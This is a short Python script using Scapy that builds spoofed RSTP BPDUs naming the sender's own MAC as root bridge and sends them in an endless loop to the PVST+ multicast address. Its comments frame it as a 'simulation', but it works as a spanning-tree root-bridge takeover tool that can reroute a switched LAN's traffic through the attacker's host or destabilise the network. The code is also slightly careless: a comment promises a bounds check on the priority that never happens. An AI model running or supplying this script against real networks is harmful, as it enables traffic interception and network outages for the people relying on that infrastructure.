from scapy.all import *
from scapy.layers.l2 import Ether, LLC, STP, Dot1Q

# Ask for user input on priority and VLAN ID
user_priority = int(input("Enter the bridge priority (should be a multiple of 4096): "))
vlan_id = int(input("Enter the VLAN ID (use 1 for non-trunk/access port simulation): "))

# Ensure the priority is correctly formatted
priority = user_priority if user_priority % 4096 == 0 else (user_priority // 4096) * 4096

# Calculate the final bridge priority including the VLAN ID
bridge_priority = priority + vlan_id  # Ensure the sum does not exceed 65535

# Interface MAC address
src_mac = get_if_hwaddr("eth0")

# Set destination MAC address for PVST+ BPDUs (Cisco-specific)
dst_mac = "01:00:0C:CC:CC:CD"

# Ethernet frame for STP BPDUs with PVST+ destination MAC
ether = Ether(dst=dst_mac, src=src_mac)

# VLAN tag for trunk port simulation (for non-trunk/access, no VLAN tag will be added)
if vlan_id == 1:
    # For non-trunk (or VLAN 1), do not use VLAN tagging
    vlan = None
else:
    # For trunk ports, use 802.1Q VLAN tagging with PCP value set to 7 for network control
    vlan = Dot1Q(vlan=vlan_id, prio=7)  # 'prio=7' sets the PCP (Priority Code Point) to 7

# RSTP/MSTP BPDU (BPDU Type set to 0x02 for Rapid/Multiple Spanning Tree)
bpdu = STP(
    version=2,  # Version 2 for RSTP (Rapid Spanning Tree)
    bpdutype=0x02,  # 0x02 for Rapid/Multiple Spanning Tree BPDU
    bpduflags=0,
    rootid=bridge_priority,  # Bridge priority (VLAN specific)
    rootmac=src_mac,
    pathcost=4,
    bridgeid=bridge_priority,  # Bridge ID should include the VLAN
    bridgemac=src_mac,
    portid=0x8001,
    age=1,
    maxage=20,
    hellotime=2,
    fwddelay=15
)

# Encapsulate in LLC
llc = LLC(dsap=0x42, ssap=0x42, ctrl=3)

# Construct the packet
if vlan is None:
    # For non-trunk/access port (VLAN 1), no VLAN tag
    packet = ether / llc / bpdu
else:
    # For trunk port (other VLANs), add VLAN tag with priority 7
    packet = ether / vlan / llc / bpdu

try:
    print("Sending RSTP/MSTP BPDU packets with BPDU Type 0x02... Press Ctrl+C to stop.")
    while True:
        sendp(packet, iface="eth0", verbose=False)
except KeyboardInterrupt:
    print("Stopped sending packets.")
